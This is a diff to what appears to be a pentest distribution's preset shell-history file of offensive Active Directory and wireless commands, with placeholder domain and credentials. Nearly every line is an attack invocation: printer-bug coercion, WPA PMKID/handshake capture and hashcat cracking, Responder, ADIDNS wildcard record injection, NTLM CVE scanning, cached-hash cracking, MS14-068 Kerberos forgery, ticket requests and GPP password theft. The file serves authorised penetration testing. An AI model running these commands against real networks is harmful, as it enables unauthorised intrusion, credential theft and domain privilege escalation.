@@ -14,7 +14,7 @@ nslookup -type=srv _ldap._tcp.BREAKING.BAD
 nslookup -type=srv _ldap._tcp.dc._msdcs.BREAKING.BAD
 nbtscan -r 192.168.56.0/24
 nmap --script dns-srv-enum --script-args dns-srv-enum.domain=BREAKING.BAD
-mount -t cifs //192.168.56.201/C\$ /tmp/mnttarget/ -o username=anonymous -o domain=BREAKING.BAD
+mount -o domain='BREAKING.BAD' -o username='someuser' -o password='somepassword' -t cifs '//DC01.BREAKING.BAD/SYSVOL' /tmp/mnttarget/
 rpcdump.py DC01.BREAKING.BAD | grep -A 6 MS-RPRN
 rpcdump.py DC02.BREAKING.BAD | grep -A 6 MS-RPRN
 dementor.py -d breaking.bad -u anonymous -p anonymous 192.168.56.1 DC02.BREAKING.BAD
@@ -205,9 +205,9 @@ hcxdumptool -I
 hcxdumptool -i wlan1 -o dump.pcapng --active_beacon --enable_status=1
 hcxpcapngtool -o dump.hashcat dump.pcapng
 hcxhashtool -i dump.hashcat --info stdout
-hashcat --hash-type 16800 --attack-mode 0 dump.hashcat `fzf-wordlists`
+hashcat --hash-type 16800 --attack-mode 0 dump_WPA-PMKID-PBKDF2.hashcat `fzf-wordlists`
 hcxpcapngtool --all -o dump.hashcat dump.pcapng
-hashcat --hash-type 22000 --attack-mode 0 dump.hashcat `fzf-wordlists`
+hashcat --hash-type 22000 --attack-mode 0 dump_WPA-PBKDF2-PMKID_EAPOL.hashcat `fzf-wordlists`
 responder --interface eth0 --analyze --lm
 ntlmv1-multi --ntlmv1 SV01$::BREAKING.BAD:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:AD1235DEAC142CD5FC2D123ADCF51A111ADF45C2345ADCF5:1122334455667788
 airmon-ng start wlan1
@@ -259,13 +259,24 @@ proxychains adidnsdump --dns-tcp -u "BREAKING.BAD\someuser" -p 'somepassword' --
 ngrok authtoken AUTHTOKEN:::https://dashboard.ngrok.com/get-started/your-authtoken
 feroxbuster -w `fzf-wordlists` -u http://192.168.10.10/
 bloodhound-import -du neo4j -dp exegol4thewin *.json
-bloodhound-quickwin -u neo4j -p exegol4thewin'
-ldapsearch-ad -l 'dc01.breaking.bad' -d 'breaking.bad' -u 'someuser' -p 'somepassword' -t all
-ldapsearch-ad -l 'dc01.breaking.bad' -t info
+bloodhound-quickwin -u neo4j -p exegol4thewin
+ldapsearch-ad --server 'dc01.breaking.bad' --domain 'breaking.bad' --username 'someuser' --password 'somepassword' --type all
+ldapsearch-ad --server 'dc01.breaking.bad' --type info
 dnstool.py -u 'BREAKING.BAD\johndoe' -p 'somepassword' --record '*' --action query DC01.BREAKING.BAD
 dnstool.py -u 'BREAKING.BAD\johndoe' -p 'somepassword' --record '*' --action add --data 192.168.56.1 DC01.BREAKING.BAD
 ntlm-scanner -vuln CVE-2019-1019 -target 'BREAKING.BAD'/'someuser':'somepassword'@'DC01.BREAKING.BAD'
 ntlm-scanner -vuln CVE-2019-1338 -target 'BREAKING.BAD'/'someuser':'somepassword'@'DC01.BREAKING.BAD'
 ntlm-scanner -vuln CVE-2019-1166 -target 'BREAKING.BAD'/'someuser':'somepassword'@'DC01.BREAKING.BAD'
 ntlm-scanner -vuln CVE-2019-1040 -target 'BREAKING.BAD'/'someuser':'somepassword'@'DC01.BREAKING.BAD'
+das add -db dbname masscan '-e eth0 --rate 1000 -iL hosts.txt --open -p1-65535'
+das add -db dbname rustscan '-b 1000 -t 2000 -u 5000 -a hosts.txt -r 1-65535 -g --no-config --scan-order "Random"'
+das scan -db dbname -hosts all -oA report1 -nmap '-Pn -sVC -O' -parallel
+das scan -db dbname -ports 22,80,443,445 -show
+das report -hosts 192.168.1.0/24 -oA report2
+hashcat --status --hash-type 2100 --attack-mode 0 '$DCC2$10240#user#bb38628253e7681553b72e7da3adf305' `fzf-wordlists`
+pypykatz kerberos tgt "kerberos+rc4://BREAKING.BAD\someuser:bb38628253e7681553b72e7da3adf305@domain.local"
+ms14-068.py -u someuser@breaking.bad --rc4 0123456789krbtgtnthash0123456789 -s S-1-5-11-39129514-1145628974-103568174 -d dc01.breaking.bad
+getST.py -k -no-pass -spn host/dc01.breaking.bad breaking.bad/someuser
+ldapdomaindump --user 'breaking.bad\someuser' --password 'somepassword' --outdir ldapdomaindump dc01.breaking.bad
+Get-GPPPassword -debug -no-pass dc01.breaking.bad
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
